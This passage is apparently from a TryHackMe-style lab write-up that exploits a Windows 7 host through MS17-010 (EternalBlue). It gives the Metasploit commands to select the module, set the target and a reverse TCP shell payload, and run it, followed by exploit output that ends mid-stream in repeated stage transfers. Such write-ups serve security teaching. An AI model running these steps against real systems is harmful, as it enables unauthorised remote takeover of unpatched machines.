</span></span><span class=line><span class=cl><span class=p>|</span>        servers <span class=o>(</span>ms17-010<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=p>|</span>           
</span></span><span class=line><span class=cl><span class=p>|</span>     Disclosure date: 2017-03-14
</span></span><span class=line><span class=cl><span class=p>|</span>     References:
</span></span><span class=line><span class=cl><span class=p>|</span>       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</span></span><span class=line><span class=cl><span class=p>|</span>       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span></span><span class=line><span class=cl><span class=p>|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2017-0143
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Sat Apr  9 02:11:43 2022 -- 1 IP address (1 host up) scanned in 121.52 seconds</span>
</span></span></code></pre></td></tr></table></div></div><p>The machine seems to be vulnerable to <code>ms17-010 (CVE-2017-0143)</code>, also known as
<code>EternalBlue</code></p><hr><h2 id=task-2-gain-access>Task 2: Gain Access</h2><h3 id=exploit-the-machine-and-gain-a-foothold>Exploit the machine and gain a foothold.</h3><hr><ul><li>Start Metasploit</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfconsole
</span></span></code></pre></td></tr></table></div></div><ul><li>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/&mldr;&mldr;..)</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; search ms17-010 -t exploit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                      Disclosure Date  Rank     Check  Description</span>
</span></span><span class=line><span class=cl>   -  ----                                      ---------------  ----     -----  -----------
</span></span><span class=line><span class=cl>   <span class=m>0</span>  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span class=line><span class=cl>   <span class=m>1</span>  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span><span class=line><span class=cl>   <span class=m>2</span>  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
</span></span><span class=line><span class=cl>   <span class=m>3</span>  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
</span></span></code></pre></td></tr></table></div></div><p>We found an exploit for ms17-010.</p><p>The exploit <code>exploit/windows/smb/ms17_010_eternalblue</code> should do the trick.</p><ul><li>Show options and set the one required value. What is the name of this value? (All caps for submission)</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; show options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options <span class=o>(</span>exploit/windows/smb/ms17_010_eternalblue<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name           Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----           ---------------  --------  -----------
</span></span><span class=line><span class=cl>   RHOSTS                          yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://github.com/rapid7/metasploit-framework/wik
</span></span><span class=line><span class=cl>                                             i/Using-Metasploit
</span></span><span class=line><span class=cl>   RPORT          <span class=m>445</span>              yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
</span></span><span class=line><span class=cl>   SMBDomain                       no        <span class=o>(</span>Optional<span class=o>)</span> The Windows domain to use <span class=k>for</span> authentication. Only affects Wind
</span></span><span class=line><span class=cl>                                             ows Server <span class=m>2008</span> R2, Windows 7, Windows Embedded Standard <span class=m>7</span> target machines
</span></span><span class=line><span class=cl>                                             .
</span></span><span class=line><span class=cl>   SMBPass                         no        <span class=o>(</span>Optional<span class=o>)</span> The password <span class=k>for</span> the specified username
</span></span><span class=line><span class=cl>   SMBUser                         no        <span class=o>(</span>Optional<span class=o>)</span> The username to authenticate as
</span></span><span class=line><span class=cl>   VERIFY_ARCH    <span class=nb>true</span>             yes       Check <span class=k>if</span> remote architecture matches exploit Target. Only affects Windows
</span></span><span class=line><span class=cl>                                             Server <span class=m>2008</span> R2, Windows 7, Windows Embedded Standard <span class=m>7</span> target machines.
</span></span><span class=line><span class=cl>   VERIFY_TARGET  <span class=nb>true</span>             yes       Check <span class=k>if</span> remote OS matches exploit Target. Only affects Windows Server <span class=m>200</span>
</span></span><span class=line><span class=cl>                                             <span class=m>8</span> R2, Windows 7, Windows Embedded Standard <span class=m>7</span> target machines.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>windows/x64/meterpreter/reverse_tcp<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name      Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----      ---------------  --------  -----------
</span></span><span class=line><span class=cl>   EXITFUNC  thread           yes       Exit technique <span class=o>(</span>Accepted: <span class=s1>&#39;&#39;</span>, seh, thread, process, none<span class=o>)</span>
</span></span><span class=line><span class=cl>   LHOST     192.168.178.101  yes       The listen address <span class=o>(</span>an interface may be specified<span class=o>)</span>
</span></span><span class=line><span class=cl>   LPORT     <span class=m>4444</span>             yes       The listen port
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Exploit target:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Id  Name
</span></span><span class=line><span class=cl>   --  ----
</span></span><span class=line><span class=cl>   <span class=m>0</span>   Automatic Target
</span></span></code></pre></td></tr></table></div></div><p>The required value we need to set is the IP address of our target machine (out victim).</p><p>In our case it is <code>10.10.14.17</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; <span class=nb>set</span> RHOSTS 10.10.14.17
</span></span><span class=line><span class=cl><span class=nv>RHOSTS</span> <span class=o>=</span>&gt; 10.10.14.17
</span></span></code></pre></td></tr></table></div></div><p>So the name of the require value is <code>RHOSTS</code></p><ul><li>Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:</li></ul><p>set payload windows/x64/shell/reverse_tcp</p><p>Ok let&rsquo;s use this reverse tcp payload to get a shell connection via reverse tcp
from the victim.</p><p>One important step that THM is not telling me is that I need to set my listener ip
address to the ip of my tun0 adapter since it will not work if I am listening
on my normal wifi adapter because I am connected to a VPN.</p><p>So let&rsquo;s fix that!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; <span class=nb>set</span> LHOST tun0
</span></span><span class=line><span class=cl><span class=nv>LHOST</span> <span class=o>=</span>&gt; tun0
</span></span></code></pre></td></tr></table></div></div><p>With that set I will try to run the exploit now!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.8.33.96:4444 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445       - Host is likely VULNERABLE to MS17-010! - Windows <span class=m>7</span> Professional <span class=m>7601</span> Service Pack <span class=m>1</span> x64 <span class=o>(</span>64-bit<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445       - Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445 - The target is vulnerable.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - Connecting to target <span class=k>for</span> exploitation.
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445 - Connection established <span class=k>for</span> exploitation.
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445 - Target OS selected valid <span class=k>for</span> OS indicated by SMB reply
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - CORE raw buffer dump <span class=o>(</span><span class=m>42</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - 0x00000000  <span class=m>57</span> <span class=m>69</span> 6e <span class=m>64</span> 6f <span class=m>77</span> <span class=m>73</span> <span class=m>20</span> <span class=m>37</span> <span class=m>20</span> <span class=m>50</span> <span class=m>72</span> 6f <span class=m>66</span> <span class=m>65</span> <span class=m>73</span>  Windows <span class=m>7</span> Profes
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - 0x00000010  <span class=m>73</span> <span class=m>69</span> 6f 6e <span class=m>61</span> 6c <span class=m>20</span> <span class=m>37</span> <span class=m>36</span> <span class=m>30</span> <span class=m>31</span> <span class=m>20</span> <span class=m>53</span> <span class=m>65</span> <span class=m>72</span> <span class=m>76</span>  sional <span class=m>7601</span> Serv
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - 0x00000020  <span class=m>69</span> <span class=m>63</span> <span class=m>65</span> <span class=m>20</span> <span class=m>50</span> <span class=m>61</span> <span class=m>63</span> 6b <span class=m>20</span> <span class=m>31</span>                    ice Pack <span class=m>1</span>      
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445 - Target arch selected valid <span class=k>for</span> arch indicated by DCE/RPC reply
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - Trying exploit with <span class=m>12</span> Groom Allocations.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - Sending all but last fragment of exploit packet
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - Starting non-paged pool grooming
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445 - Sending SMBv2 buffers
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - Sending final SMBv2 buffers.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - Sending last fragment of exploit packet!
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - Receiving response from exploit packet
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445 - ETERNALBLUE overwrite completed successfully <span class=o>(</span>0xC000000D<span class=o>)</span>!
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - Sending egg to corrupted connection.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.14.17:445 - Triggering free of corrupted buffer.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
